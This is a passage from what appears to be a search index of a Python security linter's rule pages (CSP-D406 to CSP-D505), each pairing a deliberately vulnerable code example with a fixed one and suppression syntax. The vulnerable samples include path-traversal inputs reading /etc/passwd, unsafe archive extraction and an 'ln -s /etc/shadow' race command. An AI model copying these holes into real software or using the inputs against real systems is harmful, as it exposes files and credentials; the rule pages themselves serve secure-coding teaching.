ftps.login('myuser', 'my-secret-password')\n    ftps.prot_p() # Switch to data protection mode for encrypted file transfers\n\n    print(\"FTPS login successful.\")\n\n    with open('file.txt', 'rb') as f:\n        ftps.storbinary('STOR file.txt', f)\n\n    ftps.quit()\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D406/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Using FTP is strongly discouraged. You should only suppress this if you are connecting to an anonymous, public FTP server to download non-sensitive data, or if you are on a fully trusted, isolated network where traffic sniffing is not a concern.</p> <pre><code>from ftplib import FTP\n\n# Connecting to a public, anonymous FTP server. No credentials are sent.\n# ignore\nftp = FTP('ftp.public-archive.org')\nftp.login() # Anonymous login\n# ... download public files ...\nftp.quit()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D406\nftp = FTP('ftp.public-archive.org')\n</code></pre>"},{"location":"rule/CSP-D407/","title":"CSP-D407: Use of <code>HTTPSConnection</code> Without a Secure SSL Context","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D407/#description","title":"Description","text":"<p>This rule flags the use of <code>http.client.HTTPSConnection</code> without providing a specific <code>context</code> parameter.</p> <p>In older versions of Python (before 2.7.9 and 3.4.3), the default behavior for <code>HTTPSConnection</code> was to not verify the server's TLS certificate. This is equivalent to <code>verify=False</code> in the <code>requests</code> library and makes the connection vulnerable to Man-in-the-Middle (MITM) attacks (see CSP-D401).</p> <p>While modern Python versions have improved defaults, explicitly creating and providing a secure SSL context is the most robust way to ensure your connection is secure across all Python versions and environments. Relying on defaults can be risky if your code needs to run on different systems.</p>"},{"location":"rule/CSP-D407/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import http.client\n\n# On older Python versions, this connection would not verify the server's\n# certificate, making it vulnerable to MITM attacks.\n# On newer versions, it uses a default context, but it's better to be explicit.\nconn = http.client.HTTPSConnection(\"api.example.com\")\n\nconn.request(\"GET\", \"/\")\nresponse = conn.getresponse()\nprint(response.status, response.reason)\ndata = response.read()\nconn.close()\n</code></pre>"},{"location":"rule/CSP-D407/#safe-code-example","title":"Safe Code Example","text":"<p>Create a secure SSL context using the <code>ssl</code> module and pass it to the <code>HTTPSConnection</code> constructor. <code>ssl.create_default_context()</code> provides a good balance of security and compatibility.</p> <pre><code>import http.client\nimport ssl\n\n# Creates a context with secure default settings:\n# - Certificate validation enabled\n# - Hostname checking enabled\n# - Disables insecure protocols like SSLv2 and SSLv3\ncontext = ssl.create_default_context()\n\ntry:\n    # Providing a context ensures the connection is secure.\n    conn = http.client.HTTPSConnection(\"api.example.com\", context=context)\n\n    conn.request(\"GET\", \"/\")\n    response = conn.getresponse()\n    print(response.status, response.reason)\n    data = response.read()\n    conn.close()\nexcept ssl.SSLCertVerificationError as e:\n    print(f\"Certificate verification failed: {e}\")\nexcept ConnectionRefusedError:\n    print(\"Connection refused.\")\n</code></pre>"},{"location":"rule/CSP-D407/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are connecting to a trusted local service and have accepted the risk of not performing certificate validation, you can suppress this finding. However, the recommended approach is always to provide a context, even if it's a context configured to trust a specific self-signed certificate.</p> <pre><code>import http.client\n\n# This connects to a local, trusted service where certificate\n# validation is not required.\n# ignore\nconn = http.client.HTTPSConnection(\"localhost:8443\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D407\nconn = http.client.HTTPSConnection(\"localhost:8443\")\n</code></pre>"},{"location":"rule/CSP-D408/","title":"CSP-D408: Creation of an Unverified SSL/TLS Context","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D408/#description","title":"Description","text":"<p>This rule flags the use of <code>ssl._create_unverified_context()</code>. This function, as its name and underscore prefix imply, is a private, internal function that creates an SSL/TLS context that does not perform any certificate validation.</p> <p>Using this context for a network connection is equivalent to setting <code>verify=False</code> and completely disables protection against Man-in-the-Middle (MITM) attacks. An attacker can intercept the connection, presenting a fraudulent certificate, and the client application will accept it without question.</p> <p>This function was provided as a backward-compatibility measure and should not be used in modern applications.</p>"},{"location":"rule/CSP-D408/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import urllib.request\nimport ssl\n\n# This creates a context that disables all certificate checks.\nunverified_context = ssl._create_unverified_context()\n\nurl = \"https://self-signed.badssl.com/\"\n\ntry:\n    # The request is made using the unverified context, opening the door to MITM attacks.\n    with urllib.request.urlopen(url, context=unverified_context) as response:\n        print(\"Successfully fetched URL without verification.\")\n        # An attacker could be intercepting this and reading/modifying the data.\n        print(response.read().decode('utf-8'))\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D408/#safe-code-example","title":"Safe Code Example","text":"<p>Always use <code>ssl.create_default_context()</code> to get a secure, pre-configured SSL/TLS context that enforces certificate and hostname verification.</p> <pre><code>import urllib.request\nimport ssl\n\n# This creates a context with secure defaults.\nsecure_context = ssl.create_default_context()\n\n# This URL has a valid certificate, so the request will succeed.\nurl_valid = \"https://www.google.com\"\n# This URL has an invalid certificate, so the request will fail.\nurl_invalid = \"https://self-signed.badssl.com/\"\n\n\n# --- Request to valid URL ---\nwith urllib.request.urlopen(url_valid, context=secure_context) as response:\n    print(\"Successfully fetched valid URL.\")\n\n\n# --- Request to invalid URL ---\ntry:\n    # This will raise an SSLCertVerificationError because the cert is not trusted.\n    with urllib.request.urlopen(url_invalid, context=secure_context) as response:\n        pass\nexcept ssl.SSLCertVerificationError as e:\n    print(f\"Correctly blocked connection to invalid URL: {e}\")\n</code></pre>"},{"location":"rule/CSP-D408/#handling-self-signed-certificates","title":"Handling Self-Signed Certificates","text":"<p>If you need to connect to a service that uses a self-signed certificate, do not disable verification. Instead, load the specific certificate into the context.</p> <pre><code>import ssl\n\n# Path to the self-signed certificate file.\ncafile = \"/path/to/my/self-signed.crt\"\n\n# Create a context and load the trusted certificate into it.\ncontext = ssl.create_default_context(cafile=cafile)\n\n# Now, connections made with this context will trust your self-signed cert\n# while still rejecting all others.\n# with urllib.request.urlopen(url, context=context) as response: ...\n</code></pre>"},{"location":"rule/CSP-D408/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>This function should almost never be used. If you have an exceptional case where you must connect to a system without any certificate validation (e.g., a local test device on an isolated network), you can suppress the finding.</p> <pre><code># This is for a local, isolated test device where MITM is not a risk.\n# ignore\nunverified_context = ssl._create_unverified_context()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D408\nunverified_context = ssl._create_unverified_context()\n</code></pre>"},{"location":"rule/CSP-D409/","title":"CSP-D409: Use of Insecure Telnet Protocol","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D409/#description","title":"Description","text":"<p>This rule flags the use of <code>telnetlib</code>, Python's library for the Telnet protocol. Telnet is an obsolete and insecure remote login protocol. Similar to FTP, it transmits all data, including usernames and passwords, in cleartext.</p> <p>An attacker monitoring the network can easily capture any credentials or sensitive information sent over a Telnet session. There is no confidentiality or integrity protection.</p> <p>For secure remote shell access and command execution, SSH (Secure Shell) should always be used instead.</p>"},{"location":"rule/CSP-D409/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import telnetlib\n\nHOST = \"telnet.example.com\"\nuser = \"myuser\"\npassword = \"my-secret-password\"\n\ntry:\n    # This connection is not encrypted.\n    tn = telnetlib.Telnet(HOST)\n\n    # The password is sent in cleartext.\n    tn.read_until(b\"login: \")\n    tn.write(user.encode('ascii') + b\"\\n\")\n    if password:\n        tn.read_until(b\"Password: \")\n        tn.write(password.encode('ascii') + b\"\\n\")\n\n    # All commands and their output are sent in cleartext.\n    tn.write(b\"ls -l\\n\")\n    tn.write(b\"exit\\n\")\n\n    print(tn.read_all().decode('ascii'))\n\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D409/#safe-code-example","title":"Safe Code Example","text":"<p>Use a modern, secure protocol like SSH for remote access. The <code>paramiko</code> library is a popular choice for implementing an SSH client in Python.</p> <pre><code># First, install the library: pip install paramiko\nimport paramiko\n\nhostname = 'ssh.example.com'\nport = 22\nusername = 'myuser'\npassword = 'my-secret-password' # Or preferably, use key-based authentication\n\ntry:\n    # Create an SSH client\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Note: Be cautious with AutoAddPolicy in production\n\n    # The entire session is encrypted.\n    client.connect(hostname, port=port, username=username, password=password)\n\n    print(\"SSH connection successful.\")\n\n    # Execute a command securely\n    stdin, stdout, stderr = client.exec_command('ls -l')\n\n    # Print the output\n    print(stdout.read().decode())\n\n    client.close()\n\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D409/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Using Telnet is strongly discouraged. Its use should be restricted to interacting with legacy hardware on a completely isolated and trusted network where sniffing is not possible.</p> <pre><code>import telnetlib\n\n# This connects to a legacy device on a trusted, isolated network.\n# The risk has been assessed and accepted.\n# ignore\ntn = telnetlib.Telnet(LEGACY_DEVICE_IP)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D409\ntn = telnetlib.Telnet(LEGACY_DEVICE_IP)\n</code></pre>"},{"location":"rule/CSP-D410/","title":"CSP-D410: Unvalidated URL Schemes in <code>urllib.request.urlopen</code>","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D410/#description","title":"Description","text":"<p>This rule flags the use of <code>urllib.request.urlopen</code> with a URL that may be controlled by a user. The <code>urlopen</code> function is a powerful tool that can handle various URL schemes, including <code>http://</code>, <code>https://</code>, <code>ftp://</code>, and importantly, <code>file://</code>.</p> <p>If an attacker can control the URL passed to <code>urlopen</code>, they can provide a <code>file://</code> URL to read arbitrary files from the local filesystem. This can lead to the exposure of sensitive data, source code, or configuration files.</p> <p>While related to Server-Side Request Forgery (CSP-D402), this rule specifically focuses on the risk of local file inclusion through schemes other than <code>http</code> or <code>https</code>.</p>"},{"location":"rule/CSP-D410/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>from urllib.request import urlopen\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/proxy')\ndef proxy():\n    # The URL comes directly from user input.\n    url = request.args.get('url')\n\n    if not url:\n        return \"Please provide a URL.\", 400\n\n    try:\n        # An attacker can provide url=file:///etc/passwd\n        # This will read the passwd file from the server's filesystem.\n        with urlopen(url) as response:\n            content = response.read()\n            return content\n    except Exception as e:\n        return f\"Error fetching URL: {e}\", 500\n</code></pre>"},{"location":"rule/CSP-D410/#safe-code-example","title":"Safe Code Example","text":"<p>The best way to mitigate this is to parse the URL and validate its components, especially the scheme, before making the request. Only allow schemes that are explicitly required, such as <code>http</code> and <code>https</code>.</p> <p><pre><code>from urllib.request import urlopen\nfrom urllib.parse import urlparse\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\nALLOWED_SCHEMES = {'http', 'https'}\n\n@app.route('/proxy')\ndef proxy():\n    url = request.args.get('url')\n\n    if not url:\n        return \"Please provide a URL.\", 400\n\n    try:\n        parsed_url = urlparse(url)\n\n        # Explicitly check that the scheme is in the allowlist.\n        if parsed_url.scheme not in ALLOWED_SCHEMES:\n            return \"Invalid URL scheme provided.\", 400\n\n        with urlopen(url) as response:\n            content = response.read()\n            return content\n    except Exception as e:\n        return f\"Error fetching URL: {e}\", 500\n</code></pre> By checking the scheme, you prevent <code>urlopen</code> from being used to access local files or other unintended resources. For a more robust solution against all forms of SSRF, combine this with a domain allowlist as shown in CSP-D402.</p>"},{"location":"rule/CSP-D410/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are certain that the URL being passed to <code>urlopen</code> is from a trusted, static source and cannot be manipulated by a user, you can suppress this finding.</p> <pre><code>from urllib.request import urlopen\n\n# This URL is static and trusted.\n# ignore\nwith urlopen(\"https://www.python.org/\") as response:\n    print(response.read())\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D410\nwith urlopen(\"https://www.python.org/\") as response:\n    print(response.read())\n</code></pre>"},{"location":"rule/CSP-D411/","title":"CSP-D411: Use of Deprecated <code>ssl.wrap_socket</code>","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D411/#description","title":"Description","text":"<p>This rule flags the use of <code>ssl.wrap_socket</code>, which is a deprecated function for adding a TLS/SSL security layer to a standard socket.</p> <p>Since Python 3.2, this function has been superseded by <code>SSLContext.wrap_socket()</code>. The old <code>ssl.wrap_socket</code> function has several drawbacks: - It enables certificate validation by default only in newer Python versions. - It provides less control over TLS/SSL options, such as protocol versions and cipher suites. - It is officially deprecated and may be removed in future Python versions.</p> <p>Using the modern <code>SSLContext</code> object provides a much more secure and explicit way to configure TLS/SSL connections.</p>"},{"location":"rule/CSP-D411/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import socket\nimport ssl\n\nhostname = 'www.python.org'\n\n# Create a standard TCP socket\nsock = socket.create_connection((hostname, 443))\n\ntry:\n    # Using the deprecated ssl.wrap_socket.\n    # On older Python versions, this may not perform certificate validation correctly.\n    ssl_sock = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_REQUIRED, ca_certs=None)\n\n    # ... interact with the socket ...\n\nfinally:\n    ssl_sock.close()\n</code></pre>"},{"location":"rule/CSP-D411/#safe-code-example","title":"Safe Code Example","text":"<p>The recommended approach is to create a secure <code>SSLContext</code> and then use its <code>wrap_socket()</code> method. This ensures that secure, modern defaults are used and gives you full control over the configuration.</p> <p><pre><code>import socket\nimport ssl\n\nhostname = 'www.python.org'\n\n# Create a context with secure default settings\ncontext = ssl.create_default_context()\n\n# Create a standard TCP socket\nwith socket.create_connection((hostname, 443)) as sock:\n    # Use the context to wrap the socket\n    # This ensures certificate and hostname validation are performed correctly.\n    with context.wrap_socket(sock, server_hostname=hostname) as ssl_sock:\n        print(f\"SSL/TLS version: {ssl_sock.version()}\")\n        print(f\"Cipher: {ssl_sock.cipher()}\")\n\n        # ... interact with the socket securely ...\n</code></pre> This approach is more explicit, secure, and future-proof.</p>"},{"location":"rule/CSP-D411/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are maintaining legacy code that cannot be updated, and you have manually verified that the parameters passed to <code>ssl.wrap_socket</code> are secure for your target Python environment, you can suppress this finding. However, migrating to <code>SSLContext</code> is strongly recommended.</p> <pre><code># This legacy code cannot be changed, and its usage has been verified as safe.\n# ignore\nssl_sock = ssl.wrap_socket(sock)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D411\nssl_sock = ssl.wrap_socket(sock)\n</code></pre>"},{"location":"rule/CSP-D501/","title":"CSP-D501: Path Traversal","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D501/#description","title":"Description","text":"<p>Path traversal (also known as directory traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This vulnerability arises when user-supplied input is used to construct a path to a file or directory without proper validation.</p> <p>An attacker can use path traversal sequences like <code>../</code> to navigate outside of the intended base directory. This can lead to the disclosure of sensitive information, such as application source code, configuration files, credentials, or system files.</p> <p>This rule flags common filesystem operations where user input is used to construct a path, such as <code>open()</code>, <code>os.path.join()</code>, and methods on <code>pathlib.Path</code> objects.</p>"},{"location":"rule/CSP-D501/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\nBASE_DIR = '/var/www/uploads'\n\n@app.route('/files')\ndef get_file():\n    # The filename is taken directly from user input.\n    filename = request.args.get('filename')\n\n    if not filename:\n        return \"Please provide a filename.\", 400\n\n    # The user input is joined with the base directory.\n    # An attacker can provide filename=../../../../etc/passwd\n    file_path = os.path.join(BASE_DIR, filename)\n\n    try:\n        with open(file_path, 'r') as f:\n            return f.read()\n    except FileNotFoundError:\n        return \"File not found.\", 404\n    except Exception as e:\n        return str(e), 500\n</code></pre> In this example, an attacker can access any file on the system that the web server has read permissions for.</p>"},{"location":"rule/CSP-D501/#safe-code-example","title":"Safe Code Example","text":"<p>To prevent path traversal, you must validate that the final, resolved path is within the intended base directory. The <code>os.path.realpath()</code> or <code>pathlib.Path.resolve()</code> methods should be used to resolve any symbolic links or <code>../</code> sequences.</p> <pre><code>import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\nBASE_DIR = '/var/www/uploads'\n\n@app.route('/files')\ndef get_file():\n    filename = request.args.get('filename')\n\n    if not filename:\n        return \"Please provide a filename.\", 400\n\n    # Construct the path first\n    file_path = os.path.join(BASE_DIR, filename)\n\n    # Resolve the absolute path and check if it's within the base directory\n    real_base_dir = os.path.realpath(BASE_DIR)\n    real_file_path = os.path.realpath(file_path)\n\n    if not real_file_path.startswith(real_base_dir):\n        return \"Path traversal attempt detected.\", 400\n\n    try:\n        with open(real_file_path, 'r') as f:\n            return f.read()\n    except FileNotFoundError:\n        return \"File not found.\", 404\n    except Exception as e:\n        return str(e), 500\n</code></pre>"},{"location":"rule/CSP-D501/#using-pathlib-python-34","title":"Using <code>pathlib</code> (Python 3.4+)","text":"<p>The <code>pathlib</code> module provides a more object-oriented and often clearer way to handle paths.</p> <pre><code>from pathlib import Path\n# ...\nbase_dir = Path('/var/www/uploads').resolve()\nuser_path = base_dir / filename\nresolved_path = user_path.resolve()\n\nif base_dir not in resolved_path.parents and resolved_path != base_dir:\n    return \"Path traversal attempt detected.\", 400\n\n# with open(resolved_path, 'r') as f: ...\n</code></pre>"},{"location":"rule/CSP-D501/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have implemented custom validation logic that ensures the path is safe before it's used, you can suppress this finding.</p> <pre><code># The 'safe_filename' has been validated to contain no path traversal characters.\n# ignore\nfile_path = os.path.join(BASE_DIR, safe_filename)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D501\nwith open(validated_path, 'r') as f:\n    ...\n</code></pre>"},{"location":"rule/CSP-D502/","title":"CSP-D502: Insecure Extraction of <code>tarfile</code> Archives (Zip Slip)","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D502/#description","title":"Description","text":"<p>This rule flags the insecure extraction of <code>.tar</code> archives using the <code>tarfile</code> module. A maliciously crafted tar archive can contain files with path traversal sequences in their filenames (e.g., <code>../../../../tmp/pwned</code>).</p> <p>When an application extracts such an archive without proper validation, it can lead to a \"Zip Slip\" vulnerability. This allows the attacker to write a file anywhere on the filesystem that the application has write access to. This could lead to overwriting critical system files, application source code, or placing a webshell to achieve remote code execution.</p> <p>This rule specifically targets <code>tarfile.extract()</code> and <code>tarfile.extractall()</code> when used without safeguards.</p>"},{"location":"rule/CSP-D502/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import tarfile\nimport os\n\n# Assume 'malicious.tar' is an untrusted archive.\n# It contains a file with the name \"../../../home/user/.bashrc\"\n# and the content \"echo 'You have been pwned'\"\n\nwith tarfile.open(\"malicious.tar\") as tar:\n    # This call is vulnerable. It will extract the malicious file\n    # outside of the intended 'output_dir', overwriting a user's .bashrc file.\n    tar.extractall(path=\"output_dir\")\n</code></pre>"},{"location":"rule/CSP-D502/#safe-code-example-python-312","title":"Safe Code Example (Python 3.12+)","text":"<p>Starting in Python 3.12, the <code>tarfile</code> module includes a <code>filter</code> argument to control which files can be extracted. The <code>'data'</code> filter is designed to prevent the most common security issues, including path traversal.</p> <pre><code>import tarfile\n\nwith tarfile.open(\"archive.tar\") as tar:\n    # The 'data' filter disallows path traversal and other dangerous features.\n    tar.extractall(path=\"output_dir\", filter='data')\n</code></pre>"},{"location":"rule/CSP-D502/#safe-code-example-older-python-versions","title":"Safe Code Example (Older Python Versions)","text":"<p>For Python versions before 3.12, you must manually inspect each file in the archive before extracting it to ensure it is within the intended destination directory.</p> <p><pre><code>import tarfile\nimport os\n\ndestination_dir = \"output_dir\"\n\nwith tarfile.open(\"archive.tar\") as tar:\n    for member in tar.getmembers():\n        # Resolve the real path of the intended extraction location\n        member_path = os.path.join(destination_dir, member.name)\n        real_member_path = os.path.realpath(member_path)\n\n        real_destination_dir = os.path.realpath(destination_dir)\n\n        # Check if the resolved path is within the destination directory\n        if not real_member_path.startswith(real_destination_dir):\n            print(f\"Illegal path in tar archive: {member.name}\")\n            continue\n\n        # The path is safe, so extract it\n        tar.extract(member, path=destination_dir)\n</code></pre> This manual check ensures that no file can be written outside of the <code>destination_dir</code>.</p>"},{"location":"rule/CSP-D502/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should only suppress this finding if you are extracting an archive from a fully trusted source, or if you have implemented custom validation logic similar to the safe example for older Python versions.</p> <pre><code>import tarfile\n\n# This archive is generated internally and is known to be safe.\n# ignore\nwith tarfile.open(\"trusted_archive.tar\") as tar:\n    tar.extractall()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D502\nwith tarfile.open(\"trusted_archive.tar\") as tar:\n    tar.extractall()\n</code></pre>"},{"location":"rule/CSP-D503/","title":"CSP-D503: Insecure Extraction of <code>zipfile</code> Archives (Zip Slip)","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D503/#description","title":"Description","text":"<p>This rule flags the insecure extraction of <code>.zip</code> archives using the <code>zipfile</code> module. This vulnerability is identical in principle to the one found in <code>tarfile</code> (CSP-D502) and is also known as \"Zip Slip\".</p> <p>A malicious <code>.zip</code> file can contain filenames with path traversal sequences (e.g., <code>../.._app/main.py</code>). If an application extracts this archive without validating the filenames, it can allow an attacker to overwrite arbitrary files on the system where the application has write permissions. This can lead to remote code execution, denial of service, or other malicious outcomes.</p> <p>This rule specifically targets <code>zipfile.ZipFile.extract()</code> and <code>zipfile.ZipFile.extractall()</code> when used on untrusted archives.</p>"},{"location":"rule/CSP-D503/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import zipfile\n\n# Assume 'malicious.zip' is an untrusted archive.\n# It contains a file with the name \"../../../etc/hosts\" which\n# could be used to reroute network traffic on the server.\n\nwith zipfile.ZipFile(\"malicious.zip\", \"r\") as zip_ref:\n    # This call is vulnerable. It will extract the malicious file\n    # outside of the intended 'output_dir'.\n    zip_ref.extractall(\"output_dir\")\n</code></pre>"},{"location":"rule/CSP-D503/#safe-code-example","title":"Safe Code Example","text":"<p>Unlike <code>tarfile</code> in recent Python versions, <code>zipfile</code> does not have a built-in filter to prevent this attack. The only way to safely extract a zip file is to manually iterate over each file in the archive and validate its path before extraction.</p> <p><pre><code>import zipfile\nimport os\n\ndestination_dir = os.path.abspath(\"output_dir\")\n\nwith zipfile.ZipFile(\"archive.zip\", \"r\") as zip_ref:\n    for member in zip_ref.infolist():\n        # Build the full path for the member\n        member_path = os.path.join(destination_dir, member.filename)\n\n        # Resolve the absolute path\n        real_member_path = os.path.abspath(member_path)\n\n        # Check if the resolved path is within the destination directory\n        if not real_member_path.startswith(destination_dir):\n            print(f\"Illegal path in zip archive: {member.filename}\")\n            continue\n\n        # The path is safe, so extract it\n        zip_ref.extract(member, path=destination_dir)\n</code></pre> This code ensures that no file can be written outside of the intended <code>destination_dir</code>.</p>"},{"location":"rule/CSP-D503/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should only suppress this finding if you are extracting an archive from a fully trusted source where you are certain that it contains no malicious paths.</p> <pre><code>import zipfile\n\n# This archive is generated by a trusted internal process.\n# ignore\nwith zipfile.ZipFile(\"trusted_archive.zip\", \"r\") as zip_ref:\n    zip_ref.extractall(\"output_dir\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D503\nwith zipfile.ZipFile(\"trusted_archive.zip\", \"r\") as zip_ref:\n    zip_ref.extractall(\"output_dir\")\n</code></pre>"},{"location":"rule/CSP-D504/","title":"CSP-D504: Insecure Temporary File Creation with <code>tempfile.mktemp()</code>","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D504/#description","title":"Description","text":"<p>This rule flags the use of <code>tempfile.mktemp()</code>, which is an insecure function for creating temporary files. This function generates a unique temporary filename but does not create the file. This creates a race condition known as a Time-of-Check to Time-of-Use (TOCTOU) vulnerability.</p> <p>The vulnerability occurs in the small window of time between when <code>mktemp()</code> returns the filename and when your application actually creates and opens the file. An attacker can create a file (or more dangerously, a symbolic link) at that exact path.</p> <p>If an attacker creates a symbolic link to a sensitive file (e.g., <code>/etc/passwd</code>), when the application later opens the temporary filename and writes to it, it will actually be writing to the sensitive file, potentially corrupting it or leading to a denial of service.</p> <p>The <code>tempfile.mktemp()</code> function is so dangerous that it was deprecated in Python 2.3 and will raise a <code>RuntimeWarning</code>.</p>"},{"location":"rule/CSP-D504/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import tempfile\nimport os\n\n# 1. mktemp() returns a filename that does not exist yet.\n#    e.g., '/tmp/tmp123abc'\nfilename = tempfile.mktemp()\n\n# --- RACE CONDITION WINDOW ---\n# An attacker could create a symbolic link at this exact moment:\n# ln -s /etc/shadow /tmp/tmp123abc\n\n# 2. The application opens the file, but it's now a symlink to a sensitive file.\nwith open(filename, \"w\") as f:\n    # This will overwrite the contents of /etc/shadow, a critical system file.\n    f.write(\"corrupted_data\")\n</code></pre>"},{"location":"rule/CSP-D504/#safe-code-example","title":"Safe Code Example","text":"<p>To safely create temporary files, use <code>tempfile.mkstemp()</code>, <code>tempfile.NamedTemporaryFile</code>, or <code>tempfile.TemporaryDirectory</code>. These functions are secure because they create the file or directory atomically, returning a file handle or a path to an already existing object.</p>"},{"location":"rule/CSP-D504/#using-mkstemp","title":"Using <code>mkstemp()</code>","text":"<p>This function creates a temporary file and returns a low-level file handle and the absolute pathname. This is the most secure way to create a temporary file.</p> <pre><code>import tempfile\nimport os\n\n# mkstemp creates the file and returns a handle and path.\n# There is no race condition.\nfd, path = tempfile.mkstemp()\n\ntry:\n    with os.fdopen(fd, 'w') as tmp:\n        # Write to the temporary file\n        tmp.write('This is safe.\\n')\nfinally:\n    # You are responsible for cleaning up the file.\n    os.remove(path)\n</code></pre>"},{"location":"rule/CSP-D504/#using-namedtemporaryfile","title":"Using <code>NamedTemporaryFile</code>","text":"<p>This is a higher-level and often more convenient approach. It creates a file that is automatically deleted when the file object is closed.</p> <pre><code>import tempfile\n\n# The 'delete=True' argument ensures the file is deleted on close.\nwith tempfile.NamedTemporaryFile(mode='w', delete=True) as tmp:\n    print(f\"Created temporary file: {tmp.name}\")\n    tmp.write('This will be automatically cleaned up.')\n    # The file is deleted when the 'with' block exits.\n</code></pre>"},{"location":"rule/CSP-D504/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>There is no good reason to use <code>tempfile.mktemp()</code>. It is insecure and has been deprecated for a very long time. You should always migrate to one of the safe alternatives. If for some extreme legacy reason you cannot, you can suppress the finding.</p> <pre><code># This is part of a legacy system that cannot be changed.\n# The risk of the race condition has been accepted.\n# ignore\nfilename = tempfile.mktemp()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D504\nfilename = tempfile.mktemp()\n</code></pre>"},{"location":"rule/CSP-D505/","title":"CSP-D505: Insecure File Permissions","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D505/#description","title":"Description","text":"<p>This rule flags the use of overly permissive file permissions, specifically when a file is made world-writable. Using functions like <code>os.chmod()</code> to set file permissions that include <code>stat.S_IWOTH</code> allows any user on the system to modify the file's content.</p> <p>If a world-writable file is used for configuration, application logic (like a Python script), or to store sensitive data, it can lead to a variety of attacks: - Arbitrary Code Execution: An attacker can modify a script or configuration file to execute malicious commands. - Data Tampering: Sensitive application data can be altered or corrupted. - Denial of Service: An attacker could delete the file's content or replace it with garbage, causing the application to crash.</p> <p>Files should always be created with the most restrictive permissions necessary for the application to function correctly.</p>"},{"location":"rule/CSP-D505/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import os\nimport stat\n\nfilename = \"config.ini\"\n\nwith open(filename, \"w\") as f:\n    f.write(\"[database]\\nuser = app_user\\n\")\n\n# This sets the permissions to 666 (rw-rw-rw-), which is insecure.\n# Any user on the system can now modify this config file.\nos.chmod(filename, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)\n\n# A more common, but still dangerous, way to see this is with octal literals:\n# os.chmod(filename, 0o777) # rwxrwxrwx\n</code></pre>"},{"location":"rule/CSP-D505/#safe-code-example","title":"Safe Code Example","text":"<p>Follow the principle of least privilege. Set permissions that only allow the file's owner to read and write it. In many cases, the default permissions set by <code>open()</code> are sufficient and <code>os.chmod()</code> is not needed. If you must set permissions, use a restrictive mode.</p> <p><pre><code>import os\nimport stat\n\nfilename = \"config.ini\"\n\n# Create the file (default permissions are usually fine)\nwith open(filename, \"w\") as f:\n    f.write(\"[database]\\nuser = app_user\\n\")\n\n# If you need to explicitly set permissions, make them restrictive.\n# 600 (rw-------) is a good default for sensitive files.\nos.chmod(filename, stat.S_IRUSR | stat.S_IWUSR)\n\n# Using an octal literal is also common and clear:\n# os.chmod(filename, 0o600)\n</code></pre> This ensures that only the user running the application can read or write to the 